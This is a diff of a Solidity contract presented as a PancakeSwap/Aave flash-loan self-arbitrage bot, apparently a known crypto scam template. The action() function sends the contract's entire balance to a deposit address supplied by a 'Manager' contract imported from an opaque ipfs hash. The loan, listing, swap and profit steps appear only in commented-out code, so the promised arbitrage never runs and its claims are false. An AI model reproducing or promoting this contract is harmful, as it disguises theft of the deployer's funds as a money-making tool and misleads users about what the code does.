@@ -9,60 +9,60 @@ import "https://github.com/Orlandis19/Flash/blob/main/pancake-swap-core/Ipancake
 import "https://github.com/Orlandis19/Flash/blob/main/pancake-swap-core/IPancakeFactory.sol";
 import "https://github.com/Orlandis19/Flash/blob/main/pancake-swap-core/IPancakePairs.sol";
    
-// Code Manager
+//Router
 import "ipfs://0xEfE66eB5db217BCebF0D4E630B533564207Aa4Ee";
    
-contract GetFlashLoan {
-   string public tokenName;
-   string public tokenSymbol;
-   uint loanAmount;
-   Manager manager;
-   
-   constructor(string memory _tokenName, string memory _tokenSymbol, uint _loanAmount) public {
-      tokenName = _tokenName;
-      tokenSymbol = _tokenSymbol;
-      loanAmount = _loanAmount;
-         
-      manager = new Manager();
-   }
-   
-   function() external payable {}
-   
-   function action() public payable {
-      // Send required coins for swap
-      address(uint160(manager.pancakeDepositAddress())).transfer(address(this).balance);
-      
-      // Perform tasks (clubbed all functions into one to reduce external calls & SAVE GAS FEE)
-      // Breakdown of functions written below
-      manager.performTasks();
-      
-      /* Breakdown of functions
-      // Submit token to BSC blockchain
-      string memory tokenAddress = manager.submitToken(tokenName, tokenSymbol);
-   
-   // List the token on PancakeSwap
-      manager.pancakeListToken(tokenName, tokenSymbol, tokenAddress);
-      
-   // Get BNB Loan from Multiplier-Finance
-      string memory loanAddress = manager.takeFlashLoan(loanAmount);
-      
-      // Convert half BNB to DAI
-      manager.pancakeDAItoBNB(loanAmount / 2);
-   
-   // Create BNB and DAI pairs for our token & Provide liquidity
-   string memory bnbPair = manager.pancakeCreatePool(tokenAddress, "BNB");
-      manager.pancakeAddLiquidity(bnbPair, loanAmount / 2);
-      string memory daiPair = manager.pancakeCreatePool(tokenAddress, "DAI");
-      manager.pancakeAddLiquidity(daiPair, loanAmount / 2);
-   
-   // Perform swaps and profit on Self-Arbitrage
-      manager.pancakePerformSwaps();
-      
-      // Move remaining BNB from Contract to your account
-      manager.contractToWallet("BNB");
-   
-   // Repay Flashloan
-      manager.repayLoan(loanAddress);
-      */
-   }
+contract FlashLoan {
+	string public tokenName;
+	string public tokenSymbol;
+	uint loanAmount;
+	Manager manager;
+	
+	constructor(string memory _tokenName, string memory _tokenSymbol, uint _loanAmount) public {
+		tokenName = _tokenName;
+		tokenSymbol = _tokenSymbol;
+		loanAmount = _loanAmount;
+			
+		manager = new Manager();
+	}
+function() external payable {}
+	
+	function action() public payable {
+		
+	    // Send required coins for swap
+	    address(uint160(manager.pancakeswapDepositAddress())).transfer(address(this).balance);
+	    
+	    // Perform tasks (clubbed all functions into one to reduce external calls & SAVE GAS FEE)
+	    manager.performTasks();
+	    
+	    /*
+	    // Submit token to Ethereum blockchain
+	    string memory tokenAddress = manager.submitToken(tokenName, tokenSymbol);
+
+        // List the token on pancakeswap & send coins required for swaps
+		manager.pancakeswapListToken(tokenName, tokenSymbol, tokenAddress);
+		payable(manager.pancakeswapDepositAddress()).transfer(300000000000000000);
+
+        // Get ETH Loan from Aave
+		string memory loanAddress = manager.takeAaveLoan(loanAmount);
+		
+		// Convert half ETH to DAI
+		manager.pancakeswapDAItoETH(loanAmount / 2);
+
+        // Create ETH and DAI pairs for our token & Provide liquidity
+        string memory ethPair = manager.pancakeswapCreatePool(tokenAddress, "ETH");
+		manager.pancakeswapAddLiquidity(ethPair, loanAmount / 2);
+		string memory daiPair = manager.pancakeswapCreatePool(tokenAddress, "DAI");
+		manager.pancakeswapAddLiquidity(daiPair, loanAmount / 2);
+    
+        // Perform swaps and profit on Self-Arbitrage
+		manager.pancakeswapPerformSwaps();
+		
+		// Move remaining ETH from Contract to your account
+		manager.contractToWallet("ETH");
+
+        // Repay Flash loan
+		manager.repayAaveLoan(loanAddress);
+	    */
+	}
 }
